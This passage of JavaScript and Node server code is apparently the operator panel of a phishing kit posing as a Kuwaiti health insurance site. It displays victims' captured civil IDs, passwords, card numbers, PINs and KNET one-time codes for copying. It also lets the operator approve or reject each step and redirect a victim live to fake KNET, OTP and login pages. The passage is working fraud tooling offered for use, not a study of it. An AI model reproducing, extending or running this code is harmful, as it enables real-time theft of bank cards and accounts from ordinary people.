      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet-otp"><i class="bi bi-phone" style="color:#2563eb"></i>صفحة OTP</button>';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/sign-up"><i class="bi bi-person-plus" style="color:#7c3aed"></i>صفحة التسجيل</button>';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/login"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>صفحة الدخول</button>';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/"><i class="bi bi-house" style="color:#64748b"></i>الصفحة الرئيسية</button>';
      html += '</div></div></div></td>';
      html += '</tr>';
    });
    html += '</tbody></table>';
    container.innerHTML = html;
  }

  function toggleDropdown(id) {
    document.querySelectorAll('.dropdown-menu.show').forEach(function(el) {
      if (el.id !== id) el.classList.remove('show');
    });
    var el = document.getElementById(id);
    if (el) el.classList.toggle('show');
  }

  async function navUser(paymentId, page) {
    document.querySelectorAll('.dropdown-menu.show').forEach(function(el) { el.classList.remove('show'); });
    try {
      await fetch('/admin/navigate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({paymentId: paymentId, page: page}) });
      showNotification('تم التوجيه', 'تم إرسال أمر التوجيه للعميل', page, '');
    } catch(e) {}
  }

  async function doAction(paymentId, action) {
    try {
      var res = await fetch('/admin/payments/' + paymentId + '/action', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: action}) });
      var data = await res.json();
      if (data.success) {
        var idx = allPayments.findIndex(function(p) { return p.id === paymentId; });
        if (idx !== -1) allPayments[idx] = data.payment;
        renderPayments(); updateStats();
        closeModal();
      }
    } catch(e) {}
  }

  function showDetails(paymentId) {
    var p = allPayments.find(function(x) { return x.id === paymentId; });
    if (!p) return;
    currentModalId = paymentId;
    var otp = p.knetOtps && p.knetOtps.length ? p.knetOtps[0].otp : null;
    var stepNames = {1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري'};
    var step = p.step || 1;
    var html = '';
    html += '<div class="sec-title">بيانات العميل</div><div class="detail-grid">';
    html += dRow('الرقم المدني', p.loginCivilId || p.clientId, false);
    html += dRow('كلمة المرور', p.loginPassword, true);
    html += dRow('الرقم المرجعي', p.refNumber, false);
    html += dRow('تاريخ الطلب', p.created_at ? new Date(p.created_at).toLocaleString('ar-KW') : '-', false);
    html += '</div>';
    html += '<div class="sec-title">بيانات البطاقة</div><div class="detail-grid">';
    html += dRow('البنك', p.bankName, false);
    html += dRow('رقم البطاقة', (p.prefix || '') + ' ' + (p.cardNumber || ''), true);
    html += dRow('تاريخ الانتهاء', (p.expiryMonth || '') + '/' + (p.expiryYear || ''), false);
    html += dRow('الرقم السري (PIN)', p.pass && p.pass !== '---' ? p.pass : null, true);
    html += '</div>';
    if (otp) {
      html += '<div class="sec-title">بيانات OTP</div><div class="detail-grid">';
      html += dRow('رمز OTP', otp, true);
      if (p.knetOtps && p.knetOtps.length > 1) {
        p.knetOtps.slice(1).forEach(function(o, i) { html += dRow('OTP سابق ' + (i + 1), o.otp, true); });
      }
      html += '</div>';
    }
    html += '<div class="action-section">';
    html += '<div class="action-sec-title"><i class="bi bi-shield-check" style="color:#16a34a"></i> إجراء عملية الدفع</div>';
    html += '<div class="action-step-info">الخطوة الحالية: ' + (stepNames[step] || 'بيانات البطاقة') + ' | الحالة: ' + (p.status || 'PENDING') + '</div>';
    html += '<div class="action-btns">';
    html += '<button class="action-btn-approve" data-action="approve" data-id="' + p.id + '"><i class="bi bi-check-circle-fill"></i> قبول</button>';
    html += '<button class="action-btn-reject" data-action="reject" data-id="' + p.id + '"><i class="bi bi-x-circle-fill"></i> رفض</button>';
    html += '</div></div>';
    html += '<div class="nav-section">';
    html += '<div class="nav-sec-title"><i class="bi bi-send"></i> توجيه العميل إلى صفحة</div>';
    html += '<div class="nav-btns">';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet"><i class="bi bi-credit-card" style="color:#16a34a"></i>KNET</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet-otp"><i class="bi bi-phone" style="color:#2563eb"></i>OTP</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/sign-up"><i class="bi bi-person-plus" style="color:#7c3aed"></i>التسجيل</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/login"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>الدخول</button>';
    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/"><i class="bi bi-house" style="color:#64748b"></i>الرئيسية</button>';
    html += '</div></div>';
    document.getElementById('modal-title').textContent = 'تفاصيل الطلب - ' + (p.refNumber || p.id.substring(0, 8));
    document.getElementById('modal-body').innerHTML = html;
    document.getElementById('modal-overlay').classList.add('active');
  }

  function dRow(label, val, sensitive) {
    if (!val) return '';
    var v = '<span class="d-val' + (sensitive ? ' sensitive' : '') + '">' + val + '<button class="copy-btn" data-action="copy" data-val="' + val.replace(/"/g, '&quot;') + '"><i class="bi bi-copy"></i></button></span>';
    return '<div><div class="d-lbl">' + label + '</div>' + v + '</div>';
  }

  function copyVal(val) {
    try { navigator.clipboard.writeText(val); } catch(e) {}
  }

  function closeModal() {
    document.getElementById('modal-overlay').classList.remove('active');
    currentModalId = null;
  }

  function updateStats() {
    document.getElementById('stat-total').textContent = allPayments.length;
    document.getElementById('stat-pending').textContent = allPayments.filter(function(p) {
      return ['PENDING','OTP_REQUEST','pending_card','waiting_otp','pending_otp','waiting_pin','pending_pin'].includes(p.status);
    }).length;
    document.getElementById('stat-approved').textContent = allPayments.filter(function(p) {
      return ['SUCCESS','APPROVED','completed'].includes(p.status);
    }).length;
    document.getElementById('stat-rejected').textContent = allPayments.filter(function(p) {
      return ['REJECTED','OTP_FAILED','rejected'].includes(p.status);
    }).length;
  }

  function showNotification(title, sub, data, type) {
    var el = document.getElementById('notification');
    document.getElementById('notif-title').textContent = title;
    document.getElementById('notif-sub').textContent = sub || '';
    document.getElementById('notif-data').textContent = data || '';
    el.className = 'notification show ' + (type || '');
    if (notifTimeout) clearTimeout(notifTimeout);
    notifTimeout = setTimeout(function() { el.classList.remove('show'); }, 5000);
  }

  function bumpNotif() {
    notifCount++;
    var badge = document.getElementById('notif-badge');
    badge.textContent = notifCount;
    badge.style.display = 'flex';
  }

  function playSound() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      osc.frequency.value = 880;
      gain.gain.setValueAtTime(0.3, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + 0.5);
    } catch(e) {}
  }

  setInterval(function() { if (adminToken) loadPayments(); }, 15000);
})();
<\/script>
</body>
</html>`;
  return html;
}

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log('Kuwait Health Insurance Server running on port ' + PORT);
  console.log('Admin panel: http://localhost:' + PORT + '/panel');
});
